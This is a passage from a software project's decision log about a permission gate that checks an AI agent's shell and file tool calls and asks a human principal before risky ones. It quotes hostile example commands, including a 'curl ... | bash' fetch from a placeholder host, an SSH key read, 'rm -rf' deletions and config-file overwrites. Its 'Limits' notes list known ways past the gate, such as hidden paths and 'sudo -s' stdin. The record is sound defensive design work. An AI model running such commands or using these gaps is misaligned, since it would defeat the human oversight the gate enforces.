  child starts or finishes, no round can take a steer, and `turn.send` fails with `conflict`. It never starts a
  main-loop turn in the child. A send that waited behind a child that was locked meanwhile runs no turn. A peer
  message with no session never picks a child (docs/AGENT-WIRE.md).
- **Docs:** `docs/COMMANDS.md`, `docs/UI.md`, `docs/ui/WEB.md`, `docs/USER-GUIDE.md`, `docs/DEVELOPER-GUIDE.md`.

## D-073 (2026-10-13) Signed updates verify against a pinned trust list (issue #42)
- **Decision:** `update.require_signed` (default false) makes `exo update` verify the upstream tip with
  `git verify-commit` (SSH signatures) against `$EXO_HOME/update/allowed_signers`, then merge exactly that sha. The
  repo's `trust/allowed_signers` is only the source for the pin; `exo update --pin-trust [REV]` copies it, by hand.
  Code: `src/exo/update_verify.py`, two hooks in `src/exo/update_cmd.py`.
- **Why:** the repo cannot be its own root of trust. If the check read the list from the commit being installed, an
  attacker who can push could add their own key. A local pin makes the first trust decision a human one and makes
  every later key change visible. Opt-in because the project does not sign releases yet.
- **Limits:** trust on first use of the pin; SSH signatures only; commit signatures, not tags; `uv tool` installs
  cannot be verified. A key compromise needs the pin edited by hand.
- **Amended 2026-10-17:** three gaps closed. git chooses the verify backend from the signature's armor, not from
  `gpg.format`, so an OpenPGP or X.509 signature went to the local gpg keyring and never read the pin. The check now
  switches both backends off and requires an SSH signature header. A `config.json` that exists but cannot be read,
  or a `require_signed` that is not a boolean, refuses the update instead of reading as off. Once a pin exists,
  `--pin-trust REV` takes a different list only if the commit that last changed it in REV's first-parent history
  verifies against the current pin. The commit that set the list is checked, not REV, because the documented
  rotation pins `@{u}` when later commits are signed only by the new key. No override flag: the hand edit above is
  the override. A list a pinned key signed earlier can still be pinned again (no rollback protection). The pin,
  `$EXO_HOME/update/allowed_signers`, and `config.json` are not yet store paths, so a plain `cp` or redirect to
  them is not asked about. D-074 (#125) adds them. A commit message need not be UTF-8: only the header is read.
- **Amended 2026-10-21 (#133):** the pin is a store path now (the D-038 amendment of the same date). A tool call
  that writes, moves or deletes anything in `$EXO_HOME/update`, or runs `exo update --pin-trust`, asks the principal
  every time, and only the principal can answer. `config.json` is still an ordinary local write. D-074 (#125) adds
  it.
- **Docs:** `docs/INSTALL.md` "Signed updates", `docs/DEVELOPER-GUIDE.md` "Cutting a release", `CHANGELOG.md`.

## D-074 (2026-10-13) The Exo home's `config.json` is a store path (issue #125)
- **Why:** `$EXO_HOME/config.json` names the plugins the core loads (`core_plugins`, this gate among them), their
  config, the `venv` that runs Hermes and Exo, the models, and each provider's `base_url` and headers. A tool that
  rewrites it chooses which gate runs and where prompts and keys go. On main edeb4f89 it was an ordinary file:
  `cp /tmp/evil ~/.exo/config.json`, `mv`, `install`, `tee` and `ln -sf` on it were an allowed `shell`, a
  redirection (`>`, `>>`, `>|`) an allowed `local_write`, and `write_file`, `edit_file` or `apply_patch` on it an
  allowed `local_write`, under the default policy and under `deny: [store_write]`. The signed-update pin, the other
  half of the original issue, is a store path since #133 (#443).
- **Decision:** `config.json` joins `$EXO_HOME`'s protected names (`_HOME_PROTECTED`, beside `update` and `plugins`),
  and `.exo/config.json` counts by name whatever `EXO_HOME` is (`_CONFIG_NAME`), as `.exo/update` does. So every write
  form the store checks read for `policies/` and `update/` is `store_write` (it always asks, only the principal
  answers, no grant covers it, and `deny: [store_write]` denies it): a redirection, `cp`, `mv`, `install`, `tee`,
  `sed -i`, `ln`, `dd of=`, `truncate`, `touch`, `chmod`, `rm`, a brace set, `~`, `$HOME` and `$EXO_HOME` spellings,
  a writing command after a `cd` into the home, `sudo`, `env`, `bash -c` and `ssh` text, and the file tools' path
  keys. A relative `.exo/config.json` is read with `.`, `//` and `..` collapsed, and a word a command prints counts by
  the name in it. Only the home's own file: a project's `config.json`, `config.json.bak` and the like keep their
  class. Reads stay reads. A tool call that runs `exo config set` or `unset` (also `exo config -- set`) or
  `exo import-store`, which write the file, or `exo interview`, which writes the principal store, is `store_write`
  (run as a module, `python -m exo.config set` reads as `exo config set`, while `python -m exo.cli` and
  `python -m exo.onboard` read as `exo` with the words that follow), as `exo update --pin-trust` is since #133,
  and keeps its old `opaque_exec` reading as a part, so `deny: [opaque_exec]` still denies it and naming
  `opaque_exec` at `allow` or `log` now asks. `exo providers default`, which also rewrites the file, stays
  `credentials` (D-034) with the store write as a part, so a deny on either denies it. The CLI code that writes the file is unchanged: the principal running
  it in a terminal is not a tool call.
- **Never lower than main:** before D-074 a `config.json` line was not a store write, so its own reading led it: a
  delete, a post, a secret, a `/dev` target, an `ssh` host, or the `internal` exposure of an `ssh`, `scp` or `sftp`
  `-o RemoteCommand=`. Rather than carry each of those through the store write one by one (the first #125 heads did,
  and each verify round found another), classify reads a call in which `config.json` or an exo command that writes it
  counted as the store a second time with D-074 off (`_config_off`, marked by `_config_on`), as a call of its own with
  its own budgets and memos, and keeps that reading as `Classification.ordinary`. It is one of `gate.readings`, so
  `decide` decides both and the stricter stands, with every reserved hit and violation of either (`_strictest`), and
  `no_grant`, `call_approvers`, `binds_exact` and the hook's body files and required executor read both. Main's
  decision of the line is therefore always one of the two, and the store write only adds. The cost is a second
  classify for such calls alone.
- **Stricter, by design:** a copy out of the home's `config.json` (`cp ~/.exo/config.json /tmp/`) asks, as one out of
  `policies/` does, because the store checks read every word of a write. `rm ~/.exo/config.json`, which asked as
  `delete`, asks the principal alone.
- **Limits:** as for the other store files: a glob in the file's own name (`~/.exo/config.js?`), a path in a variable
  or one a command builds from pieces (`F=~/.exo/config.json; cp x "$F"`), a write through a hard link made earlier,
  the bash tool's `cwd` argument and `python -mexo.config` written as one word, which keep main's `opaque_exec`
  ask. Names matched case-sensitively here — on a case-insensitive filesystem `~/.exo/CONFIG.JSON` kept its
  class, as `~/.exo/POLICIES/gates.yaml` did — until #601 (D-087) made the names match in any case, so these
  ask now. A symlink is not a limit: one made earlier is resolved (`_path_forms`), and
  one made on the same line (`ln -s ~/.exo/config.json /tmp/l && cp x /tmp/l`) names the file in its `ln`, which is
  the store write, as for `policies/gates.yaml` on main. A copy or extraction whose destination is a folder that
  holds the file (`cp -t ~/.exo`, `cp /tmp/x/config.json ~/.exo/`, `tar -C ~/.exo -xf`, `unzip -d ~/.exo`) is #483.
  Found while testing, not changed here: `sudo -s` and `sudo -i` with no command run a shell on their stdin, which the
  gate does not read (`sudo -s <<< 'cp /tmp/x ~/.exo/config.json'` is a `read`, as is the same line with `rm -rf`).
- **Amended 2026-10-25 (#525, rebuilt on main edeb4f89):** since #525, `config.json`'s `principal` also names the
  principal of a key with no seat file, toward a receiving daemon whose seat file names no principal (`docs/PEERS.md`
  "Limits", the D-026 #525 amendment). One unasked write could change whose messages such a daemon delivers as its
  principal's own after a restart; a tool's write to the file now asks the principal. The first #125 heads were
  closed for this rebuild (fdn-0's review 5641582965): on them `cd ~/.ex{o,} && cp /tmp/x config.json` read lower than
  main, and the exo commands lost their `opaque_exec` part. This version keeps #443's reading of those commands and
  reads every line as main did too. The landing rule of the first heads is #483.
- **Evidence:** `tests/security/test_gate_config_store.py` (its 286 new rows fail on edeb4f89, its 247 guard rows
  pass there). The gate differential (#423) against edeb4f89, `--jobs 2`, nothing lowered in each run: the built-in
  corpus without variants (9,407 actions, 87 policies); an aimed corpus of 3,012 actions, every line of this test
  file and of the first heads' test file plus generated `config.json` writes (each writer, home spelling and
  wrapper, the file tools, the exo commands, and each beside a delete, a force push, a post, a key read, a publish,
  a `policies/` write and a `/dev` target), under the 87 built-in policies and 51 more (deny, reserved and category
  entries on `store_write`, `local_write`, `opaque_exec`, `credentials`, `read`, `shell` and `delete`, matrix cells,
  `opaque_exec` at `internal` and at a host, irreversible `credentials`, costly rules and `/dev` targets); and the
  built-in corpus with its variants (72,618 actions, 87 policies). Against main 2923f8b9 (after #545's body-file
  rule): the test file's 299 fix rows fail there and its 255 guard rows pass, among them quoted and split names
  (`~/.exo/con'fig'.json`), symlinks made earlier or on the line, and `CONFIG.JSON` keeping its class;
  `plugins/exo-gate/tests/test_unseen_body.py` shows the hook reading the `ordinary` reading (a body file beside a
  `config.json` write stays unread, the post asks once, a required executor refuses it); and the differential,
  `--jobs 2`, lowers nothing on the built-in corpus (9,911 actions, 87 policies) or the aimed one (3,012, 138).
- **Amended 2026-10-26 (after #587 merged as a8a4ffbd):** #320 matches a store name an expansion hides with
  `_store_glob`, which takes the home's names from `_HOME_PROTECTED`. #587's merge put `config.json` there, and
  `_store_glob` counted it without `_config_on`, so the call was not marked and kept no reading as before D-074, or that
  reading counted the file too. Such a line lost main's reading: under `matrix_deny_cells`,
  `ssh -o RemoteCommand='rm -rf /srv/data; cp /tmp/x ~/.exo/con$(:)fig.json' h` asked where main 3e5620b3 denied it,
  and so did a delete beside such a name under `delete: deny` with a rule allowing `^rm`, and an `echo x >` to it over
  ssh under an entry on `opaque_exec` at `internal` exposure (gate_diff from ad26a9d8 to a8a4ffbd: 269 pairs lowered
  on 141 actions). `_store_glob` now counts the home's `config.json` only while it counts (`_counts`), so the call is
  marked and its reading as before is main's. The store write itself is unchanged: such a name, an unknown name in the
  home itself (`~/.exo/$(date).json`), and a principal store's `config.json` named through an expansion
  (`~/.exo/principals/a/con$(:)fig.json`, though its literal name keeps its class) still ask.
- **Docs:** `docs/GATE.md` "The store is credentials (D-038)", `docs/PEERS.md` "Limits", `docs/USER-GUIDE.md` §6,
  `CHANGELOG.md`.

## D-075 (2026-10-13) A deny or reserved entry matches any simple command on a line
- **Why:** the 2026-10-13 review. `classify_shell` reduces a compound line to its most severe part, and `decide`
  checked the principal's `deny` and `reserved` lists against that one part only. With `vcs_push` in `deny`,
  `git push origin main` alone was denied, but `git push origin main && rm -rf build` was an `ask` for the delete,
  `git push origin main; cat ~/.ssh/id_rsa` an `ask` for the credential read, and `git push origin main && gh pr
  comment 3 --body hi` an `ask` for the post. The card named the other action, and the denied push ran once it was
  approved. Only `command:<regex>` entries were immune, because they see the whole line.
- **Decision:** a classification keeps the simple commands it was built from (`parts`, nested through `bash -c`,
  `python -c`, `eval`, `xargs` and the rest). `decide` applies the principal's scopes to each and checks `reserved`
  and `deny` entries against the combined result and every part; a hit on any part denies (or reserves) the line.
  Parts are checked for `deny` and `reserved` only: rules, category overrides, the opaque bump, third-party
  escalation, posting checks and the floors still see the dominant part, which sets the card, the category and
  everything else. A part carries the tool of the call it came in on (`tool:execute_code` names the tool, not
  `python -c` run from bash) and the decoded views of its line (#136), so a `command` entry matches a part as it
  matches the line (`g''it push origin main && rm -rf build`), the `ssh` hop is a part of its own whose target is
  the bare host (no `user@`, `ssh://` or `:port`) and the destination as written, and the inner commands of an `ssh`
  line are `internal` like the line. A
  string literal in code is kept when any simple command in it is non-benign, whatever the order. A mapping entry in
  `deny` or `reserved` counts only its match keys: `reason`, `name`, a note or a typo is dropped, so it widens the entry
  and never voids it (rejecting it at load would fall back to the defaults and lose the whole list). `Decision.reserved`
  lists the parts a reserved entry matched, once each, under the pinned policy and a pending one alike, and the exo-gate
  hook refuses a standing grant for the line's category when one of them lies outside the grant; it compares the targets
  as written, and only the decision's ledger view redacts URL userinfo. `ssh` options are read as getopt reads them, so
  a value-taking letter at the end of a cluster (`-vp 22`) or `-B`/`-P`/`-I` no longer puts the option's value in the
  host's place; such a line asks, and wherever the gate now reads another host than it used to, the line asks and
  both readings' parts are matched. A `--` right after the `ssh` host ends the options. `mosh` options are read as mosh's
  Perl Getopt::Long reads them in its default mode, against mosh's own option list: one or two dashes or `+`, any
  case, a unique prefix, `=value` or the next word, options after the host, `--` ending them, and mosh's own short
  options (`-o` takes no value, `-l` is `--local`). A word that names no single option stops mosh and the line asks.
  The command given to `mosh --ssh`, `--client` or `--server` is read as a command and the line asks (the `--ssh` and
  `--client` helpers run locally and keep their own exposure; `--server` runs on the remote host, and with `--local`
  the server and the command run locally too, so nothing on the line is `internal`). Another option's value that
  reads as `--server`, `--ssh` or `--client` (`--port '--server=...'`) is not run by mosh, but the gate read it as
  the command before, so it still does and the line asks. Words after the host that mosh takes as options or values
  are also read as the command and the line asks, since with `POSIXLY_CORRECT` set mosh runs them as the command;
  the same holds where the host the gate reads changed. The
  ledger view of a classification (`as_dict`) leaves the parts out, so approval bindings and trace rows are unchanged.
  *Amendment 2026-10-19 (issue #191):* a `categories: {X: deny}` line or a rule with `decision: deny` was still
  checked against the dominant part only, so `echo $(git push origin main) > /tmp/f` was `log` under
  `categories: {local_write: deny}` while `deny: [local_write]` denied it. Now `decide` also decides each part
  below the combined result as it would decide that command alone, by its category's line and then the first rule
  that matches it (plus a deny rule whose `command` regex matches a decoded view of the line, #136); a `deny`
  there denies the line, and the reason names the part. Only a deny reaches the parts: allow, log and ask lines
  and rules keep deciding by the dominant part, and `reserved` stays the way to ask on any part. A deny on a
  command the gate cannot read still becomes an ask (Limits below). Rejected: the most restrictive category line over all parts (a lower line on the dominant part would no longer
  apply, and an allow rule on a part's target would stop counting).
  *Amendment 2026-10-20 (issue #394):* a rule's `command` regex saw the whole line, for the combined result and for
  every part. That is right for a veto (#136), but an allow or log rule written for one command then lowered lines
  whose deciding command it did not name. `{command: '^git status', decision: allow}` allowed
  `git status; git push --force origin main`, also under `categories: {force_push: deny}`, although the push alone
  asks or is denied. In the #191 pass `{command: 'rm -rf build', decision: allow}` lifted
  `categories: {github_post: deny}` from the post in `gh pr comment 3 --body hi && rm -rf build`. The fix may only
  make a decision stricter than before or leave it alone, for any line, tool, policy or context, and it does so by
  construction. A rule keyed on `command` that would lower a compound line must match the line as before, and its
  regex must also name the line's commands. A rule would lower the line when its decision is below the line's matrix
  cell and category line (an allow or log rule over an ask cell, an ask rule under a category deny), or when it is an
  allow or log rule that names `opaque_exec`, which lowers the indirection floor. Its regex must then also match the
  own text (`Classification.own`) of every part that carries the line's category or is as severe as the combined
  result, of every other part that alone would get a stricter outcome than the rule gives (a rider), and of every
  command that changes the shell for later commands on the line (a setter, `Classification.setters`). A rule that
  fails is passed over and the first-match walk goes on, but the rule step keeps the stricter of the first match, as
  before, and the rule found after it. A rule passed over never names `opaque_exec` for the floor, and a later rule
  names it only when the first match does too. In the #191 pass an allow, log or ask rule keyed on `command` counts
  for a part only when its regex also matches that part's own text. Deny rules and the #136 veto match there as
  before, so every part denied before is denied now. Each step keeps the stricter outcome, so this pass is never
  looser than before. When it passes a rule over, the gate also decides the line as before, and that decision stands,
  reason and all, unless the new one is stricter. This pass reads rules and patterns that deciding as before never
  reaches (the walk past a rule passed over, each regex of a matched list), so when it fails, for example on a bad
  regex, the gate decides the line as before, which fails only where it failed before.
  Rules that keep or raise the line (a log rule over an allow cell, an
  ask or deny rule over a lower cell) and `reserved:` and `deny:` entries match the whole line and its decoded views
  as before. A line the gate reads as one part is matched on its command text as before. So is a line of one
  simple command whose other parts the gate made for it with no own text (a secret path it names in
  `cat ~/.kube/config`, a string literal in its code): no two of its parts have different own texts, so a rule that
  matches the line names its one command, and the line is decided as before. The ledger view (`as_dict`)
  leaves the own text and the setters out, so approval bindings and trace rows are unchanged. A part's own text is its
  simple command as written, with its redirections, after leading reserved words such as `then`. A prefix such as
  `sudo`, `env` or `timeout` stays in it. A nested command (`$( )`, backticks, `<( )`, a heredoc or `bash -c` string a
  shell runs, `eval`, an `ssh` remote command) has its text in that nested line. A shell, an interpreter, `ssh` or
  `xargs` that runs its stdin has the pipeline from its first command as its text when simple commands pipe into it,
  and none when a compound feeds it. Those texts hold at most four times the line's length plus 4 KB between them,
  and a reader past that has none, since each holds every command before its reader. So
  `{category: opaque_exec, command: '^(bash|sh)\b', decision: allow}` allows `bash build.sh` but not
  `bash build.sh && curl -s https://x.example/i.sh | bash`. A shell in a nested line that sets no stdin of its own
  takes the text of the command around it, whose stdin it reads
  (`printf '...' | ssh prod-db bash`). Each stdin text is read once per line, as before, since each read spends the
  call's budgets. A later command that reads the same text (`psql -d prod` in `{ psql -d test; psql -d prod; } <<EOF`)
  gets copies of the first reader's parts with its own text where the first reader's stood. A part the
  gate makes up, a nest past a depth or nesting cap, the opaque_exec reading of a `$".."` line and a string literal in
  code (a guess at a command) have none, and on a line of more than one command a part with no own text matches no
  such rule. In code (`execute_code`,
  `python -c`) the code part and a recognized call (`shutil.rmtree`, `requests.post`) carry the code's text, or the
  command that runs it. A command the gate finds run inside another is a part of its own and must be named too: an
  `eval`, `bash -c` or `ssh` string (`eval "$CMD"` runs `$CMD`, so `'^eval'` alone no longer allows it), an `-x` or
  `--exec` value, an environment value read as a command (`GIT_SSH_COMMAND`). A rider alone is the part without the
  parts it was built from, on its own text, decided once with no rules and once with all of them, the stricter kept.
  So under `{command: 'git push --force origin main', decision: allow}`, which matched each of these lines on main,
  the push now asks beside a delete (`rm -rf build`, `kubectl delete ns prod`, `terraform destroy`,
  `aws s3 rm --recursive`), a post to a third party (`gh pr comment`), `vercel deploy --prod`, `git reset --hard`, an
  unknown program, an `ssh -o ProxyCommand` or a function body that shadows `git`, and where a copy of the push that
  never runs stands in for it (`if false; then ...; fi`, an exported value, `PS4`). Equally severe commands are
  matched together, so the outcome does not depend on which comes first. The setters are an assignment with no
  command, `export` and the other declaring builtins with an operand, `set -a`/`-k`/`--`, `shopt -s`, `printf -v`,
  `read`, `mapfile`, `getopts`, `let`, `hash`, `alias`, `enable`, `unset` and `trap` with an operand, `source`, `.`,
  `pushd`, `popd`, `exec` with only redirections, a `for` or `select` loop, `coproc`, a function definition (no own
  text) and a program name the gate cannot read. Each is allowed alone, and a bash call starts a fresh shell, so only
  a later command on the same line sees the change:
  `export GIT_SSH_COMMAND="$(cat /tmp/cmd)"; git push --force origin main` runs whatever is in /tmp/cmd. Main allowed
  it under the rule above, and now it asks. `cd` is left off the list, so `cd repo && git push --force origin main`
  stays allowed under that rule. That cannot loosen a decision, since the rule must still match the whole line:
  `cd /tmp/evil && make test` asks under `'^make test$'`, as before. An anchored rule such as
  `'^git push --force origin main$'` still matches no compound line, as before. A rule written for a whole compound
  line, such as `'^git push origin main && git push origin dev$'`, now also has to name each command, for example as
  `['^git push origin main && git push origin dev$', '^git push origin (main|dev)$']`, and until it does the line gets
  its matrix or category outcome (here log).
  Limits: a command that would be allowed alone still rides on the rule's outcome, as before and as a less severe
  command does under a category line. `cd /tmp/other && git push --force origin main` and
  `echo x > .git/hooks/pre-push && git push --force origin main` are allowed under the unanchored rule above. A
  `deny:` or `reserved:` entry, or a category line or rule that denies that command, still stops it. Rejected:
  matching an allow or log rule on the deciding command's own text instead of the whole line (a draft of this fix). An
  anchored rule then matched lines it never matched before: `'^make test$'` allowed `cd /tmp/evil && make test`, which
  runs another Makefile, where main asked, and `'^rm -rf build$'` lifted `categories: {delete: deny}` from
  `git push --force origin main && rm -rf build`. Also rejected: matching ask and deny rules and the lists on own text
  instead of the whole line (that narrows a veto: an ask rule on `gh pr comment` would no longer ask for
  `gh pr comment 3 --body hi && rm -rf build` under `categories: {delete: allow}`), deciding every part alone with the
  strictest outcome winning (rejected above for category lines), and judging a rider under every rule (a second allow
  rule would then lower it, so `rm -rf build && git push --force origin main` would pass under two allow rules, one
  per command, where it asks now).
  *Amendment 2026-10-21 (issue #396):* the posting checks still read the dominant part only. `decide` ran the
  footer, the forbidden words and the scrub on the combined result's text, which a compound line takes from its most
  severe part. So a post that passed, put first, carried a second post past all three. Under footer `F` and the
  forbidden word `Zork`, `gh pr comment 5 -R myorg/app --body $'ok\nF' && gh pr comment 6 -R myorg/app --body 'Zork'`
  logged, while the second post alone asks. Now the posting rules read every part. A part is checked, at its own
  exposure, when its category is under `posting.applies_to` or it is a close or merge carrying text (#326, #397),
  and it carries text, a title or an unseen body. The dominant part's violations stay bare. Another part's are named
  after it. A part's unseen body is its own `unseen_body` signal, read from the signals it carried before `_combine`
  gave it every part's (`Classification.own_signals`, left out of the ledger view). So two unseen posts are both
  named. Once other parts add violations, a decision lists at most 20 and counts the rest. The dominant part's own
  violations are always all listed. So is the line-wide unseen-body note for a part the posting rules do not cover.
  The scrub compiles its patterns once per policy, since a line now runs it once per post. The posting step only
  adds violations, so no decision is looser than before. The gate differential
  (#423) bears that out. Over 28,107 actions x 87 policies (the built-in set and 11 posting policies) it lowered
  0 pairs and tightened 4,378 on 841 actions, each from log or allow to ask on a line that carries a post. Not all
  of them are `github_post` lines. A `delete` or `force_push` line whose post fails the rules asks now too: under
  `categories: {delete: allow}` and footer `F`, `rm -rf build && gh pr comment 5 -R myorg/app --body "$X"` was
  allowed and now asks. That is right, since the post on the line fails the rules. Third-party escalation,
  the matrix cell and the floors still read the dominant part. So `gh pr comment 5 -R myorg/app --body $'ok\nF' &&
  gh pr comment 6 -R other/repo --body $'fine\nF'` logs, while the second post alone asks for a third party. That
  is open as #437. Rejected: checking only the parts under `applies_to` (a close or merge on a compound line would
  lose #326 and #397), and listing every violation of every post (500 posts gave a 115,000-character reason that
  the card and the ledger repeat).
  *Amendment 2026-10-22 (issues #464, #448):* the #191 pass decided a part by its category line and rules, but not
  by its matrix cell, which `decide` read from the combined result only. So a matrix deny reached only the
  dominant part. A store write or secret that sets a line's category also hid two more of the line's decisions,
  and a file tool on a store or secret path lost its own category. Each such line still asked the principal
  alone. (1) The #191 pass now starts each part from its own matrix cell, read under the scopes, before its
  category line and its rules, which is how the part is decided alone. A `deny` there denies the line, and a
  category line or rule that lifts the part alone lifts it here too. This reaches any compound line. Under
  `matrix: {irreversible: {private: deny}}`, `rm -rf ~/work; touch ~/.exo/state/x`, `rm -rf ~/.exo/policies`
  and `git push --force origin main && rm -rf build` are denied, where they asked. Under
  `matrix: {irreversible: {internal: deny}}`, so is `git push --force origin main; echo x > ~/.exo/policies/a`,
  and under `matrix: {costly: {public: deny}}` a post beside a store write. A cell below `deny` still reads the
  dominant part only (#437). (2) After `cd /dev` or `cd /proc/self/fd`, a write the gate pins to a store path
  took that path as its only target, so a `target:/dev*` or `target:/proc*` entry no longer matched it. The
  descriptor folder is now a second store-write part. (3) The relative read check for store folders (#192) ran
  only on lines that were neither credentials nor store writes, so `tar -C ~/.exo/policies -czf - ../keys/seat`
  lost its key read and `deny: [credentials]` no longer denied it. On a store-write line that read is now a
  `credentials` part, and the line stays `store_write`, so only the principal answers. Making the line
  `credentials` instead would let a seat that `approvals.yaml` delegates `credentials` to answer it. (4) A file
  tool on a store or secret path keeps the tool's own reading as a part (#448), as a shell line does: a
  `local_write` part for each file `write_file`, `edit_file`, `patch` or `apply_patch` writes, and for a tool read
  by name (`delete_file`, `read_file`, `create_directory`, `move_file`) its own category, target, summary, and the
  text and title of a post. `move_file` and `copy_file` name their files in `source` and `destination`, so their
  part has no target. Its category deny, reserved entry, `target:` entries and matrix cell apply again, and
  the posting checks read a post's text. The call keeps its store or secret category, card, approvers and
  no-grant rule, and the ledger view still leaves the parts out. (5) The new parts reach policy patterns that
  main never ran on those calls, so a pattern that does not compile now makes `decide` raise on them, as it
  already did on other calls. The exo-gate hook's fallback for a call the gate reads as a store write or secret
  now asks the principal alone, once, in observe mode too, where it ran the call in observe mode or asked
  anyone. This lifts the trade-offs the D-038 amendments of 2026-10-21 recorded for #133 (all three kinds) and
  for #313 (group 1, and group 2 for a deny cell). Each change adds a part, a source of a deny or a stricter
  fallback, so no decision is lower than before. gate_diff (#423) ran main 3ddd89e9 against this change over the
  built-in corpus and 2,127 targeted lines and calls, under the 87 built-in policies and 18 more (a deny on each
  matrix cell, lifted and scoped cells, part denies). Main's script read 59,062 actions and the #460 one 59,526,
  and both found 0 lowered. They found 61,638 and 61,805 stricter pairs, 6,072 of the latter under the built-in
  policies. Each is a part the same policy denies alone: a delete, force push, history rewrite or post beside
  another command, a store write or a secret, a file tool's own category or file, a `/dev` or `/proc` target, or a
  key read after `tar -C`.
  Not done: an allow, log or ask cell, third-party escalation and the floors on a part (#437), a `target:` entry
  for a second store on a credentials line (#313 group 4, done by the D-038 amendment of 2026-10-27 for #609),
  and checking policy patterns when the policy loads (#466).
  A relative key read keeps the name as written as its target, as `tar -C ~/.exo -czf - keys/seat` already does,
  so `target:*/.exo/keys/*` matches neither.
- **Rejected:** denying the line when the combined category is in the list only (the bug); passing the policy into
  `classify` so `_combine` could prefer a denied part (ties classification to one policy, and the plugin decides
  under two policies while a change is pending).
- **Limits:** a literal inside `python -c` or `execute_code` counts only when one of its commands classifies as a
  non-benign category (an all-`web_read` or all-`local_write` literal is dropped), and code can reach a target with
  no literal at all. Deny → ask: where the gate cannot read the command it files the line as `opaque_exec`, so a
  `deny` on the hidden action becomes an `ask`, for example a heredoc after a `coproc` block (the rest of `coproc` is
  read since #140 / #181), nesting past the depth cap (#137, #141), `eval $(...)`, a command arriving on stdin
  (`echo ... | xargs -I{} sh -c '{}'`) and the
  wrappers `watch`, `parallel`, `tmux`, `screen` and `setsid`; the list is not closed. Deny → allow: the fallback
  had gaps where the line is `allow` outright even under `deny`: `${...}` bodies, which the lexer did not read
  (#143; read since #158). Since #164 an `ssh`/`mosh` chain past the hop cap asks (#153) and command-valued options of
  allowlisted programs are read (#154).
- **Revisit if:** a principal wants a denied action to be allowed when it is part of a longer line. None asked;
  the entry format says "no agent may take" the action.

## D-077 (2026-10-15) Core budget: a ratchet with headroom, functionality and robustness first
- **Status:** Accepted 2026-10-15. The principal's ruling: "important to be lean and optimized but not at the cost of
  functionality and robustness and product-market fit". It replaces the budget part of D-067 (the hard 15,000-line
  ceiling). D-067's cuts and seams stand.
- **Why:** after #124 the count was 14,813. #91 (required executor boundary) added 46 lines and #87 (model spend
  boundary) added 140, so main stands at 14,999, one line under the wall. The next fix would have waited for a cut.
  A line count is a signal of a lean core. The aim is structure, and security, robustness and product work must not
  be blocked by the signal.
- **Decision:** `tests/integration/test_wave1_acceptance.py` records `CORE_FLOOR = 14813` and `CORE_HEADROOM = 1000`
  and asserts only `total < CORE_FLOOR + CORE_HEADROOM` (ceiling 15,813).
  - The floor ratchets down: every real reduction PR (deletions, simplification, real seams per ENGINE-SPLIT) sets it
    to its post-merge count in the same PR. It never goes up.
  - Headroom is for shipping: fixes and features land inside it with no ceremony. The test prints the count, the
    floor and the headroom left, and its failure message shows them.
  - Security and robustness fixes are never blocked. If one would cross the ceiling, its PR raises `CORE_HEADROOM` by
    the minimum needed with a one-line note here, and the lead schedules a reduction within the week. A feature that
    would cross the ceiling waits for a reduction or carries a recorded decision.
  - The goal is structural (ENGINE-SPLIT step 4: no private-state reads across module boundaries, no product imports
    into the engine, one responsibility per module). The test also prints the largest counted files and flags any
    above 1,000 lines, as information only.
  - The `CORE` list is never edited to dodge the count.
- **Rejected:** keeping the wall and raising it by a step each time (the count chases the work, with no pressure to
  cut); retiring the count (ENGINE-SPLIT asks for import-direction checks first, and none exist); excluding modules
  or moving code to dodge the count.
- **Numbering:** D-074 and D-075 are held by open PRs (#125, #126) and D-076 by a parallel reduction PR, so this is D-077.
- **Numbers:** floor 14,813 is the count at the merge of #124 (D-067 recorded 14,812 on the branch before its last
  merge from main). Main (859fbcc) is at 14,999, so 814 lines are left. No source changed.
- **Revisit if:** the headroom is raised more than once for non-security work, or the floor stops falling for a long time.
- **Validation:** the budget test, `tests/docs`, `tests/test_privacy.py`, `tests/test_versioning.py`, `ruff check`.
- *2026-10-19 (#314, fixes #242):* CORE_HEADROOM raised by 58 to 1,058 for the serve start lock, a robustness fix; the lead schedules a reduction this week.
- **Amendment 2026-10-19 (reduction, #332):** a no-behavior-change reduction (dead code, merged duplicates, shorter equivalent forms) took the counted core from 15,870 on main to 15,776 (94 lines; it was 15,800 before #314). `CORE_FLOOR` stays 14,813: the count was already above the floor, and the floor never goes up, so setting it to the new count would have lifted the ceiling by about 960 lines. `CORE_HEADROOM` is back at 1,000 after #314's temporary raise to 1,058, so the rule-4 raise is undone by the reduction it called for. Ceiling 15,813, headroom left 37.
- *2026-10-20 (#346, follow-up to #321):* CORE_HEADROOM raised by 29 to 1,029 for the job notice fixes (key redaction and event loop robustness). The lead schedules a reduction this week.
- **Amendment 2026-10-20 (reduction, #373):** a no-behaviour-change reduction (dead overrides, merged duplicates, an exception clause the following handler could never reach, shorter equivalent forms) took the counted core from 15,841 on main to 15,801 (40 lines). `CORE_FLOOR` stays 14,813: the count is above the floor, and the floor never goes up. `CORE_HEADROOM` is back at 1,000 after #346's temporary raise to 1,029, so the rule-4 raise is undone by the reduction it called for. Ceiling 15,813, headroom left 12.
- *2026-10-26 (#598):* CORE_HEADROOM raised by 11 to 1,011 for the turn-author plumbing into hooks, a security fix: the gate can now tell who started a turn and lowers bypass only for the principal's.
- **Docs:** `docs/ENGINE-SPLIT.md` "Budget policy", `docs/CORE.md`, `docs/DEVELOPER-GUIDE.md` §7, `docs/WHITEPAPER.md`
  §11 and §27, `CHANGELOG.md`.

## D-079 (2026-10-16) A stalled event subscriber is ended and resumes with since
- **Status:** Accepted 2026-10-16.
- **Why:** `Hub.publish` put every event in an unbounded queue per subscriber. A client that stops reading blocks
  its SSE loop in `drain()`, so its queue grew one for one with the stream and one stalled client could grow the
  core's memory without bound (the audit of main 35b7de8 left 29,792 of 30,000 notices queued).
- **Decision:** a subscriber whose queue holds `MAX_LAG` (4,096) unread events is ended on the next publish. The hub
  drops what it has not read and queues the end marker it already uses on shutdown, so the stream closes right after
  the last event the client read and the publisher never waits. `Hub.closed` tells this close from a shutdown.
  - Every client in the repo resumes with `since`: the protocol client with `reconnect`, the exo-bus link, the
    terminal window's `LocalClient` and stdio `serve_lines` (they subscribe again until the hub closes, so a window
    that took over keeps its core), and `exo web`, whose re-bootstrap replays from the last event it applied. It
    does so for up to `4 * MAX_LAG` (16,384) missed events. A longer gap, such as a long outage while the core kept
    working, replays the newest 5,000 as on start, so one response never carries an unbounded backlog (a
    100,000-event gap took 2 s in one reply).
  - A reader that keeps up must stay far below the cap. Tool threads hand output to the loop with
    `call_soon_threadsafe`, and every callback queued between two loop turns runs before any reader does. On main one
